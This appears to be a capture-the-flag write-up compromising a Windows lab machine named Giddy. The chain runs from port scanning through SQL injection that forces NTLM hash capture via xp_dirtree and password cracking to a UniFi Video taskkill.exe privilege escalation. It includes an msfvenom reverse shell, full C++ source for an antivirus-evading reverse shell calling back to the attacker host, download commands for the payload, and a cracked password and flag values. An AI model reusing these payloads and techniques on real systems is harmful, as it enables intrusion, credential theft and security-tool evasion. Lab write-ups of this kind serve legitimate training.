
## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 10.129.96.140 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 10:03 -0500
Nmap scan report for 10.129.96.140
Host is up (0.025s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-01-09T15:05:07+00:00; +1s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2026-01-09T15:04:45+00:00
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2026-01-08T15:01:38
|_Not valid after:  2026-07-10T15:01:38
|_ssl-date: 2026-01-09T15:05:07+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   22.24 ms 10.10.14.1
2   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.38 seconds
```

Enumerated Endpoints on the target system.

```
gobuster dir -u http://10.129.96.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.140
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/mvc                  (Status: 301) [Size: 148] [--> http://10.129.96.140/mvc/]
/*                    (Status: 400) [Size: 3420]
```

Upon Accessing the endpoint on /mvc we get information about the website. It's providing registering functionality and an login panel. I created an user and logged in

```
root:password
```

Upon inspecting the product category, the url changed.

```
http://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=18
```

Since this is an Windows Box i'm assuming MSSQL is running, we can utilize the in-built functionality for low-privileged users within an mssql database called "xp_dirtree" in order to send an request from the target to an listener we setup on our local machine. Since the request will try to authenticate the current user we will be stealing the NTLM Hash of the user.

1. Let's start up our listener / NTLM Stealer.

```
responder -I tun0
```

2. Utilized following SQLi Query:

```
http://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=18; EXEC MASTER.sys.xp_dirtree '\\10.10.14.161\hack'
```

Successfully stole the NTLM Hash of user "Stacy".

```
[SMB] NTLMv2-SSP Client   : 10.129.96.140
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:152fc7b285a0970a:B4C8D3A97FFDB3E0DF897972A38533B4:010100000000000080C1AC456281DC01455A6C9F04F0071A00000000020008004D0049003300390001001E00570049004E002D0059004C00590057004A0043005200460044005300370004003400570049004E002D0059004C00590057004A004300520046004400530037002E004D004900330039002E004C004F00430041004C00030014004D004900330039002E004C004F00430041004C00050014004D004900330039002E004C004F00430041004C000700080080C1AC456281DC01060004000200000008003000300000000000000000000000003000008CB89C771B8E7738C7FA30C266AAD3236D792E141FE3C04F5F220AA9F47F41410A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310036003100000000000000000000000000
```

Bruteforced the NTLM Hash and gained credentials.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xNnWo6272k7x     (Stacy)     
1g 0:00:00:00 DONE (2026-01-09 12:25) 1.234g/s 3322Kp/s 3322Kc/s 3322KC/s xamtrex..x215534x
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

```
Stacy:xNnWo6272k7x
```

Let's test if we can login with xfreerdp3. This didn't work out. But I know that the /remote endpoint was an powershell session, let's try & access it with user "stacy". Logged in successfully and gained PowerShell CLI / Command Execution.

```
Username:\Stacy Password:xNnWo6272k7x Computer Name: GIDDY
```

Retrieved user.txt in C:\Users\Stacy\Desktop.

```
b0cf1d8c8bb11d341782ea4e2770bfad
```

I tried countless ways to get RCE, but all seem to be prevented. After being hardstuck for some time, I identified an service called "unifivideo". Performing Vulnerability Assessment on this application revealed the following local privilege escalation.

```
https://www.exploit-db.com/exploits/43390
```

Apparently an taskkill.exe is getting ran with NT AUTHORITY\SYSTEM, when the service is getting started or stopped. If we have write permissions, we can most likely get SYSTEM shell. Let's check if we have write permissions in the directory. We have!

```
Upon start and stop of the service, it tries to load and execute the file at
"C:\ProgramData\unifi-video\taskkill.exe". However this file does not exist in
the application directory by default at all.

By copying an arbitrary "taskkill.exe" to "C:\ProgramData\unifi-video\" as an
unprivileged user, it is therefore possible to escalate privileges and execute
arbitrary code as NT AUTHORITY/SYSTEM
```

Let's first start an listener on port 5985 on our local machine.

```
nc -lvnp 5985
```

Created an malicious payload utilizing msfvenom.

```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=5985 -f exe > rev.exe
```

Downloaded into target machine.

```
PS C:\ProgramData\unifi-video> 

iwr -uri http://10.10.14.161/rev.exe -OutFile C:\ProgramData\unifi-video\taskkill.exe
```

Our malicious payload is getting detected by AV 24/7. The Security Mechanics seem very strong, we'll need to search up some good evasion tactiques.

Found an c++ reverse shell script which evades antiviruses and applocker functionality.

```
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024

void XTJRSHZ(char* XGFXEG, int XERGTJ) {
    while (true) {
        Sleep(5000);
        
        SOCKET REXQGW;
        sockaddr_in addr;
        WSADATA version;
        
        WSAStartup(MAKEWORD(2, 2), &version);
        REXQGW = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(XGFXEG);
        addr.sin_port = htons(XERGTJ);
        
        if (WSAConnect(REXQGW, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(REXQGW);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            
            int RecvCode = recv(REXQGW, RecvData, DEFAULT_BUFLEN, 0);
            
            if (RecvCode <= 0) {
                closesocket(REXQGW);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)REXQGW;
                
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                
                memset(RecvData, 0, sizeof(RecvData));
                RecvCode = recv(REXQGW, RecvData, DEFAULT_BUFLEN, 0);
                
                if (RecvCode <= 0) {
                    closesocket(REXQGW);
                    WSACleanup();
                    continue;
                }
                
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main(int argc, char** argv) {
    FreeConsole();
    
    if (argc == 3) {
        int port = atoi(argv[2]);
        XTJRSHZ(argv[1], port);
    }
    else {
        char host[] = "10.10.14.161";
        int port = 443;
        XTJRSHZ(host, port);
    }
    
    return 0;
}
```

Compiled it.

```
i686-w64-mingw32-g++ shell.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

Downloaded binary into _C:\Windows\System32\spool\drivers\color_

```
iwr -uri http://10.10.14.161/taskkill.exe -OutFile C:\Windows\System32\spool\drivers\color\taskkill.exe
```

moved it into C:\ProgramData\unifi-video

```
move C:\Windows\System32\spool\drivers\color\taskkill.exe C:\ProgramData\unifi-video\taskkill.exe
```

Started up my listener on port 443.

```
nc -lvnp 443
```

Since the taskkill.exe get's executed with nt authority\system rights if we stop or start the service we should be getting an shell now.

```
Stop-Service "Ubiquiti UniFi Video"
```

Gained RCE as user "nt authority".

```
nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.161] from (UNKNOWN) [10.129.96.140] 50115
whoami
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
a756887124b5ef68943eab6148796467
```
